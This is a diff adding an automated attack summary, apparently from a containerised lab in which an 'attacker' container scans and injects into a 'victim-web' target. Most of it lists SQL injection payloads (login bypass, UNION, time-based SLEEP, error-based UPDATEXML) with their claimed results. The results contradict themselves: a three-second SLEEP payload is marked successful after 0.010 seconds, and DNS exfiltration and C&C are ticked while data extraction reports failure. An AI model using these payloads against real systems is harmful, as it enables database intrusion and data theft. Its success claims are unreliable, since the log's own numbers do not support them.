@@ -1,0 +1,73 @@
+SecurityLogs Enhanced Attack Summary
+===============================
+Timestamp: 2025-07-24T02:38:17.374428
+Target: victim-web
+Target URL: http://victim-web:80
+Container ID: attacker
+
+Attack Phases Completed:
+1. Network Reconnaissance (Nmap)
+2. Web Application Enumeration (Dirb + Nikto)
+3. Custom SQL Injection Attacks
+4. Data Extraction
+
+Files Generated:
+- /opt/output/container_attack_log.json
+- /opt/output/scan_results.json
+- /opt/output/sql_injection_results.json
+- /opt/output/attack_summary.txt
+- /opt/output/extracted_data.html
+
+Scan Results Summary:
+- Nmap: Completed
+- Dirb: Completed
+- Nikto: Completed
+
+SQL Injection Attack Statistics:
+================================
+Total Login Injections: 6
+✅ Successful: 4
+❌ Failed: 2
+Success Rate: 66.7%
+
+Total Search Injections: 5
+✅ Successful: 5
+❌ Failed: 0
+Success Rate: 100.0%
+
+Overall Attack Success Rate: 81.8%
+
+Successful Login Payloads:
+1. admin' -- (Status: 200, Time: 0.029s)
+2. admin' OR '1'='1 (Status: 200, Time: 0.017s)
+3. ' OR 1=1-- (Status: 200, Time: 0.008s)
+4. admin'/* (Status: 200, Time: 0.012s)
+
+Failed Login Payloads:
+1. ' UNION SELECT 1,2,3-- (Status: 200, Error: True)
+2. ' OR 'x'='x (Status: 200, Error: False)
+
+Successful Search Payloads:
+1. ' OR 1=1-- (Status: 200, Time: 0.009s)
+2. ' UNION SELECT 1,2,3,4,5-- (Status: 200, Time: 0.020s)
+3. ' AND (SELECT COUNT(*) FROM users)>0-- (Status: 200, Time: 0.012s)
+4. ' AND (SELECT SLEEP(3))-- (Status: 200, Time: 0.010s)
+5. ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- (Status: 200, Time: 0.009s)
+
+Data Extraction Results:
+========================
+Method: N/A
+Payload: N/A
+Success: False
+Status Code: N/A
+File Saved: False
+
+DNS Attack Results:
+==================
+
+DNS Reconnaissance: ✅
+DNS Tunneling: ✅
+Data Exfiltration: ✅
+C&C Communication: ✅
+
+Attack completed at: 2025-07-24T02:38:17.374586
